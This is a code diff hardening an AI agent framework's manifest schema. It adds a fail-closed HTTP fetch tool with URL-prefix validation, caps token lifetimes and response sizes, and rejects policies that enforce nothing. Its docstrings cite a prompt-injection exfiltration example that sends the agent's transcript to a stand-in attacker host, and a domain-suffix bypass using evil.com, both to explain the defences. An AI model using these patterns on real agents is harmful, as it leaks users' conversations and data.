@@ -22,6 +22,10 @@ ABSOLUTE_LIMITS = {
     "max_input_tokens": 1_000_000,
     "max_output_tokens": 100_000,
     "max_cost_usd": 1_000.0,
+    # A durable run's resume token, and therefore the lifetime of the caller scopes the fiber
+    # records. It was the one lifetime in this file with no ceiling, which made "inherited
+    # authority dies with the run" a promise the manifest author could set to ten years.
+    "resume_token_ttl_seconds": 86_400,
 }
 
 
@@ -44,6 +48,12 @@ MAX_INTEGRATION_TIMEOUT_MS = MAX_INTEGRATION_TIMEOUT_S * 1000
 # getaddrinfo inside a pydantic validator; that resolution has since moved to dial time, but
 # the per-ref compile cost stands on its own.)
 MAX_REFS = 64
+
+# Ceiling on a single fetched response. The far end chooses how much it sends, so without a
+# cap one call can exhaust the context window or the worker's memory. Generous rather than
+# tight: `spec.artifacts` spills a large tool result to the object store and hands the model
+# a preview, so the useful limit is "will not take the process down", not "will fit inline".
+MAX_FETCH_BYTES = 5_000_000
 
 
 def assert_valid_manifest_name(name: str) -> None:
@@ -122,8 +132,11 @@ class PromptTemplateSpec(_Strict):
 
 class SkillRef(_Strict):
     name: str
-    version: str | None = None
+    # Read by `a2a/card.py`, which surfaces it on the agent card. Not read by the skills
+    # loader — a skill's own SKILL.md frontmatter supplies the description used in the
+    # catalogue — so the two are deliberately separate.
     description: str | None = None
+    version: str | None = None
 
 
 class McpServerRef(_Strict):
@@ -219,7 +232,6 @@ class ContainerRef(_Strict):
     container_tool_name: str = ""
     timeout_ms: int | None = Field(default=None, gt=0, le=MAX_INTEGRATION_TIMEOUT_MS)
     auth: str = ""
-    args_schema: dict[str, Any] | None = None
     fatal: bool = False
 
     @field_validator("auth", mode="before")
@@ -250,6 +262,11 @@ class QueueRef(_Strict):
     fatal: bool = False
 
 
+# No `args_schema` on the three refs below. `tools_from_sandboxes`, `tools_from_containers`
+# and the browser binder each hardcode their argument model (`SandboxArgs`,
+# `ContainerArgs`, `BrowserUrlArgs`) because the executor reads fixed keys — a
+# manifest-supplied schema could only advertise arguments the executor would ignore,
+# which is worse than none. `QueueRef` and `ClientToolRef` do read theirs.
 class SandboxRef(_Strict):
     name: str = Field(min_length=1)
     description: str = ""
@@ -257,7 +274,6 @@ class SandboxRef(_Strict):
     sandbox_tool_name: str = ""
     timeout_ms: int | None = Field(default=None, gt=0, le=MAX_INTEGRATION_TIMEOUT_MS)
     path_prefix: str = ""
-    args_schema: dict[str, Any] | None = None
     fatal: bool = False
 
 
@@ -268,8 +284,74 @@ class BrowserToolRef(_Strict):
     op: Literal["content", "links", "snapshot", "screenshot", "pdf", "json"] = "content"
     timeout_ms: int | None = Field(default=None, gt=0, le=MAX_INTEGRATION_TIMEOUT_MS)
     path_prefix: str = ""
-    args_schema: dict[str, Any] | None = None
     fatal: bool = False
+
+
+class HttpFetchToolRef(_Strict):
+    """Read a model-supplied URL over HTTP(S).
+
+    The inverse of `McpServerRef`-style integrations and of `HttpExecutor`: the destination
+    is chosen by the model, not the manifest, so `path_prefix` is how an author narrows it
+    back down. Bounded here rather than at the tool because a manifest is the only place
+    that knows what this agent should be allowed to read.
+    """
+
+    name: str = Field(min_length=1)
+    description: str = ""
+    # An operator-set prefix the URL must start with, e.g. "https://docs.felix.run/".
+    # Empty means any address the egress guard permits.
+    path_prefix: str = ""
+
+    @field_validator("path_prefix")
+    @classmethod
+    def _validate_prefix(cls, v: str) -> str:
+        """An absolute http(s) URL, normalised to end in '/'.
+
+        This was the only URL-bearing field on any ref without a validator, and unlike the
+        others it is a *security boundary* rather than a destination. Two failures it let
+        through: `https://docs.felix.run` (no trailing slash) matched
+        `https://docs.felix.run.evil.com/`, the classic domain-suffix bypass; and a prefix
+        with no scheme, or the wrong case, matched nothing at all and turned the tool into
+        one that refuses every call with no signal at author time.
+        """
+        if not v:
+            return v
+        from urllib.parse import urlsplit
+
+        parts = urlsplit(v)
+        if parts.scheme not in ("http", "https") or not parts.netloc:
+            raise ValueError(f"path_prefix must be an absolute http(s) URL, got {v!r}")
+        # Normalising here rather than at match time means the stored manifest says exactly
+        # what will be enforced.
+        return v if v.endswith("/") else v + "/"
+
+    timeout_ms: int | None = Field(default=None, gt=0, le=MAX_INTEGRATION_TIMEOUT_MS)
+    # Response cap. The far end chooses the length, so this bounds both the context window
+    # the result can consume and the memory one call can hold.
+    max_bytes: int | None = Field(default=None, gt=0, le=MAX_FETCH_BYTES)
+    # "text" renders HTML to readable text; "raw" returns the body as served.
+    format: Literal["text", "raw"] = "text"
+    fatal: bool = False
+    # Unrestricted egress has to be typed out. See `_require_a_boundary`.
+    allow_any_host: bool = False
+
+    @model_validator(mode="after")
+    def _require_a_boundary(self) -> HttpFetchToolRef:
+        """A fetch tool with no `path_prefix` is a general-purpose exfiltration primitive.
+
+        Every other outbound ref names an operator-fixed destination; this one lets the model
+        choose, so the defaults decide whether a manifest that says nothing gets the whole
+        public internet. It does not: an author who wants that writes `allow_any_host: true`
+        and can be asked why in review. Fail-closed here costs one line in the manifests that
+        genuinely need open fetching, and prevents the shape where prompt injection turns
+        `fetch_docs` into `GET https://attacker/?d=<transcript>`.
+        """
+        if not self.path_prefix and not self.allow_any_host:
+            raise ValueError(
+                f"http_tools[{self.name!r}]: set a path_prefix to confine the tool, "
+                "or allow_any_host: true to permit any address the egress guard allows"
+            )
+        return self
 
 
 class ClientToolRef(_Strict):
@@ -439,7 +521,9 @@ class PlanExecuteSpec(_Strict):
 
 class ExecutionSpec(_Strict):
     mode: Literal["durable", "transient"] = "transient"
-    resume_token_ttl_seconds: int | None = None
+    resume_token_ttl_seconds: int | None = Field(
+        default=None, gt=0, le=ABSOLUTE_LIMITS["resume_token_ttl_seconds"]
+    )
     # Tool batch execution. "sequential" preserves steer-cancel mid-batch.
     # "parallel" runs local tools concurrently (falls back to sequential for
     # client/approval tools or when any tool forces sequential).
@@ -451,6 +535,36 @@ class Policy(_Strict):
     description: str = ""
     required_scopes: list[str] = Field(default_factory=list)
     tools: list[str] = Field(default_factory=list)
+
+    @model_validator(mode="after")
+    def _enforces_something(self) -> Policy:
+        """A policy names tools *and* the scopes they require, or it enforces nothing.
+
+        `required_scopes` is the only enforcement `apply_policies` has: it denies when a
+        listed scope is absent from the caller's set. An empty list makes that check
+        vacuously true, so `policies: [{id: finance-only, tools: [wire_transfer]}]` validated,
+        compiled, wrapped the tool — `wrapped is not tool`, so it looked correct in the
+        compiled stack — and then let every anonymous caller through. A control that appears
+        in the manifest and in `felix validate-manifest` while enforcing nothing is worse than
+        a missing one, which is why this raises rather than warns.
+
+        The mirror case, scopes with no tools, gates nothing at all: no tool matches, so none is
+        wrapped. Also inert, also rejected here — and it counts toward the `soc2` profile.
+        """
+        if not self.tools:
+            raise ValueError(f"policy {self.id!r} names no tools, so it gates nothing")
+        if not self.required_scopes:
+            raise ValueError(
+                f"policy {self.id!r} lists tools but no required_scopes, so it permits every "
+                "caller while appearing to govern them. Name the scopes it requires, or drop it."
+            )
+        blank = [s for s in self.required_scopes if not s.strip()]
+        if blank:
+            raise ValueError(
+                f"policy {self.id!r} requires a blank scope name, which no caller can hold "
+                "deliberately — and which a token carrying an empty scope entry satisfies"
+            )
+        return self
 
 
 class Limits(_Strict):
@@ -567,6 +681,7 @@ class Spec(_Strict):
     queues: list[QueueRef] = Field(default_factory=list, max_length=MAX_REFS)
     sandboxes: list[SandboxRef] = Field(default_factory=list, max_length=MAX_REFS)
     browser_tools: list[BrowserToolRef] = Field(default_factory=list, max_length=MAX_REFS)
+    http_tools: list[HttpFetchToolRef] = Field(default_factory=list, max_length=MAX_REFS)
     client_tools: list[ClientToolRef] = Field(default_factory=list, max_length=MAX_REFS)
     sub_agents: list[str] = Field(default_factory=list)
     aggregator_prompt: str = ""
@@ -582,13 +697,17 @@ class Spec(_Strict):
     reflect: ReflectSpec = Field(default_factory=ReflectSpec)
     plan_execute: PlanExecuteSpec = Field(default_factory=PlanExecuteSpec)
     procedural_memory: ProceduralSpec = Field(default_factory=ProceduralSpec)
-    policies: list[Policy] = Field(default_factory=list)
+    # Bounded like every integration list above. Matching became O(rules x tools) per
+    # compile when tool targeting went glob, and `build_agent` runs per request — 8000
+    # policies measured 0.24s of synchronous CPU on the event loop, which stalls every
+    # other tenant in that worker. A manifest body of 1 MiB fits far more than 64.
+    policies: list[Policy] = Field(default_factory=list, max_length=MAX_REFS)
     limits: Limits = Field(default_factory=Limits)
     guardrails: Guardrails = Field(default_factory=Guardrails)
     content_screening: ContentScreening = Field(default_factory=ContentScreening)
     command_screening: CommandScreening = Field(default_factory=CommandScreening)
     anomaly: AnomalySpec = Field(default_factory=AnomalySpec)
-    approvals: list[ApprovalRule] = Field(default_factory=list)
+    approvals: list[ApprovalRule] = Field(default_factory=list, max_length=MAX_REFS)
     governance: GovernanceSpec = Field(default_factory=GovernanceSpec)
     recursion_limit: int | None = Field(default=None, ge=1, le=ABSOLUTE_LIMITS["recursion_limit"])
     # The one relaxation of `extra="forbid"`. A plugin that registers a pattern or
